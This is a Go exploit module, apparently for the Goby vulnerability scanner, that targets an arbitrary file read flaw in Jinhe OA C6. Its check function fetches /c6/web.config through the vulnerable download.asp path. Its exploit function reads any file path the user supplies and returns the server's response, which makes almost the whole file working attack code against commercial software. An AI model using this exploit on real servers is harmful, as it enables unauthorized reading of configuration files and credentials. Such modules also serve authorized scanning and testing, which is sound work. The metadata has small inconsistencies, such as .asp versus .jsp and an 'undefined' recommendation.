package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"regexp"
	"net/url"
)

func init() {
	expJson := `{
  "Name": "JingHe OA download.asp File read",
  "Description": "There is an arbitrary file reading vulnerability in Jinhe OA C6 download.jsp file, through which an attacker can obtain sensitive information in the server",
  "Product": "JingHe OA",
  "Homepage": "http://www.jinher.com/",
  "DisclosureDate": "2021-06-09",
  "Author": "PeiQi",
  "GobyQuery": "app=\"Jinher-OA\"",
  "Level": "2",
  "Impact": "<p>JingHe OA</p>",
  "Recommendation": "Update",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "File",
      "type": "input",
      "value": "/c6/web.config"
    }
  ],
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "File read"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "JingHe OA"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Recommandation": "<p>undefined</p>"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri := "/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
                return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "configuration")
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    file := ss.Params["File"].(string)
		    uri := "/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=" +  file
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			    if resp.StatusCode == 200 {
            		expResult.Output = resp.RawBody
            		expResult.Success = true
			    }
        	}
			return expResult
		},
	))
}